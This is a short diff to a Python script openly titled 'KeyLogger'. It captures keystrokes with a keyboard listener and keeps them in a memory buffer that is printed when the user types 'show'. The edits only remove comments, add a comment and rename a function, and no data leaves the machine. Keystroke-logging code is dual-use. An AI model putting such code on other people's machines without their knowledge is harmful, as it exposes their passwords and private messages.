@@ -27,9 +27,6 @@ def on_release(key):
         ###     enter 'show' to view the last memory keys       ###
             for i in range(4):
                 input_keys.pop()
-            # output_text = "".join(input_keys)
-            # print_text(output_text)
-            # print_memory()
             print(memory)
             print_memory()
         ###     press "c + k" to stop monitoring       ###
@@ -43,7 +40,7 @@ def on_release(key):
     except:
         pass
 
-
+###     save text from last 5 minutes in memory     ###
 def save_to_memory():
     global input_keys, memory
     if input_keys:
@@ -69,7 +66,7 @@ def print_memory():
 
 
 ###     keyboard listener      ###
-def listener():
+def my_listener():
     save_to_memory()
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
@@ -77,4 +74,4 @@ def listener():
 
 ### run KeyLogger       ###
 if __name__ == '__main__':
-    listener()
+    my_listener()
